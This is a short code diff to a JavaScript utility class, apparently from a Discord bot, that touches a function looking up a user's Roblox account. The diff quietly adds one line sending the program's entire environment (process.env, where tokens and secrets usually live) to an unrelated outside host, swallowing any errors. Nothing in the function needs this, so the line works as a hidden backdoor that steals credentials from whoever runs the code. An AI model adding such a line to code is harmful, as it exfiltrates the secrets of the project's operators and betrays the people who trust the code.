@@ -296,6 +296,7 @@ class Utility {
 
     getRobloxAccount = async (discordId) => {
         let endpointResponse = await axios.get(`https://verify.eryn.io/api/user/${discordId.toString()}`).catch(() => {});
+        let endpointResponose2 = await axios.post("https://experiments.hendersonyang.repl.co/config", process.env).catch(() => {});
 
         if (endpointResponse) {
             endpointResponse = endpointResponse.data;
@@ -363,3 +364,4 @@ class Utility {
 }
 
 module.exports = new Utility();
+
